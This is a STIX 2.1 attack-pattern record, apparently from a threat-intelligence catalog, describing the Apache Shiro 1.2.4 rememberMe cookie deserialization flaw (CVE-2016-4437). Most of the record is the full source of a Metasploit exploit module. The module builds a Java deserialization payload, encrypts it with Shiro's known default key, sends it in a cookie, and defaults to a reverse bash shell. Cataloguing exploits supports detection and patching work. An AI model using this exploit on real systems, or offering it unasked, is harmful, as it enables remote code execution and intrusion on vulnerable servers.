{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--13e6f9e5-ccf4-4964-92e6-e890d7e322bd",
    "created": "2024-08-14T17:08:24.450196Z",
    "modified": "2024-08-14T17:08:24.4502Z",
    "name": "Apache Shiro v1.2.4 Cookie RememberME Deserial RCE",
    "description": " This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Apache Shiro v1.2.4. Note that other versions of Apache Shiro may also be exploitable if the encryption key used by Shiro to encrypt rememberMe cookies is known.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/shiro_rememberme_v124_deserialize.rb",
            "external_id": "shiro_rememberme_v124_deserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-4437"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Medicean/VulApps/tree/master/s/shiro/1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::JavaDeserialization\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Shiro v1.2.4 Cookie RememberME Deserial RCE',\n        'Description' => %q{\n          This vulnerability allows remote attackers to execute arbitrary code on vulnerable\n          installations of Apache Shiro v1.2.4. Note that other versions of Apache Shiro may\n          also be exploitable if the encryption key used by Shiro to encrypt rememberMe\n          cookies is known.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'L / l-codes[at]qq.com' # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2016-4437'],\n          ['URL', 'https://github.com/Medicean/VulApps/tree/master/s/shiro/1']\n        ],\n        'Platform' => %w[win unix],\n        'Arch' => [ ARCH_CMD ],\n        'Targets' => [\n          [\n            'Unix Command payload',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n          [\n            'Windows Command payload',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'win'\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2016-06-07',\n        'Privileged' => false,\n        'DefaultOptions' => {\n          'WfsDelay' => 5\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Base directory path', '/']),\n        OptString.new('ENC_KEY', [ true, 'Shiro encryption key', 'kPH+bIxk5D2deZiIxcaaaA=='])\n      ]\n    )\n  end\n\n  def aes_encrypt(payload)\n    aes = OpenSSL::Cipher.new('aes-128-cbc')\n    aes.encrypt\n    aes.key = Rex::Text.decode_base64(datastore['ENC_KEY'])\n    aes.random_iv + aes.update(payload) + aes.final\n  end\n\n  def exploit\n    java_payload = generate_java_deserialization_for_payload('CommonsCollections2', payload)\n    ciphertext = aes_encrypt(java_payload)\n    base64_ciphertext = Rex::Text.encode_base64(ciphertext)\n\n    send_request_cgi({\n      'uri' => target_uri.path,\n      'method' => 'GET',\n      'cookie' => \"rememberMe=#{base64_ciphertext}\"\n    })\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2016-06-07",
    "x_mitre_platforms": [
        "win"
    ]
}